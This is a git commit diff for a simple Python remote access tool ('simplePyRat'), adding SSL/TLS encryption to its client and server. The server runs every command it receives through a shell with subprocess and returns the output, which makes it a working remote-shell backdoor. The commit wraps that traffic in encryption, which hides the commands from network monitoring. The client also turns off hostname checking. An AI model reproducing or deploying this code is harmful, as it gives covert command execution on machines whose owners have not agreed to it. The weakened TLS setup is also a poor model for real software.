1ec6ae99c645c03f42958067df1c0fe881605773
Brian Rease <b.rease568@gmail.com>
2021-10-07 01:37:37 -0400

    Added functionality to the server and client to create an ssl encrypted connection

--- src/ClientRat.py
+++ src/ClientRat.py
@@ -1,5 +1,6 @@
 import argparse
 import socket
+import ssl
 
 
 class ClientRat:
@@ -17,6 +18,20 @@ class ClientRat:
                 command = self.read_command()
                 self.send_command(client_socket, command)
                 self.recv_command_output(client_socket)
+
+    def create_encrypted_socket(self):
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.load_verify_locations('cert.pem')
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+            with context.wrap_socket(client_socket) as secure_client_socket:
+                secure_client_socket.connect((self.target_host, self.target_port))
+
+                while not self.quit_flag:
+                    command = self.read_command()
+                    self.send_command(secure_client_socket, command)
+                    self.recv_command_output(secure_client_socket)
 
     def read_command(self):
         user_command = input("simplePyRat# ")
@@ -36,7 +51,11 @@ class ClientRat:
 
 def main(args):
     client_rat = ClientRat(args.target, args.port)
-    client_rat.create_socket()
+
+    if args.ssl_encrypt is False:
+        client_rat.create_socket()
+    else:
+        client_rat.create_encrypted_socket()
 
 
 def _arg_parse():
@@ -44,6 +63,7 @@ def _arg_parse():
                                                  "Python Remote Access Tool")
     parser.add_argument("-t", "--target", help="The target address")
     parser.add_argument("-p", "--port", help="The target port")
+    parser.add_argument("-s", "--ssl-encrypt", action="store_true", help="Use ssl encryption")
     return parser.parse_args()
 
 
--- src/ServerRat.py
+++ src/ServerRat.py
@@ -1,6 +1,7 @@
 import socket
 import argparse
 import subprocess
+import ssl
 
 
 class ServerRat:
@@ -28,10 +29,33 @@ class ServerRat:
                     command_output = self.execute_command(data)
                     self.send_command_output(connection, command_output)
 
+    def create_encrypted_server_socket(self):
+        #context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH)
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain('cert.pem')
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+            server_socket.bind((self.listen_host, self.listen_port))
+            server_socket.listen(1)
+            print("Waiting for a secure connection...")
+            with context.wrap_socket(server_socket, server_side=True) as secure_socket:
+                connection, address = secure_socket.accept()
+                with connection:
+                    print("Secure connection received from: ", address)
+                    while True:
+                        data = self.recv_command(connection)
+
+                        if data.decode() == "quit":
+                            print("Client has ended the session.")
+                            break
+
+                        command_output = self.execute_command(data)
+                        self.send_command_output(connection, command_output)
+
     def recv_command(self, connection):
         return connection.recv(1024)
 
-    def execute_command(self,data):
+    def execute_command(self, data):
         command = data.decode()
         return subprocess.run(command, shell=True, capture_output=True)
 
@@ -41,7 +65,11 @@ class ServerRat:
 
 def main(args):
     server_rat = ServerRat(args.listen_address, args.listen_port)
-    server_rat.create_server_socket()
+
+    if args.ssl_encrypt is False:
+        server_rat.create_server_socket()
+    else:
+        server_rat.create_encrypted_server_socket()
 
 
 def _arg_parse():
@@ -49,6 +77,7 @@ def _arg_parse():
                                                  "Remote Access Tool")
     parser.add_argument("-l", "--listen-address", help="The listening address")
     parser.add_argument("-p", "--listen-port", help="The listening port")
+    parser.add_argument("-s", "--ssl-encrypt", action="store_true", help="Use ssl encryption")
     return parser.parse_args()
 
 
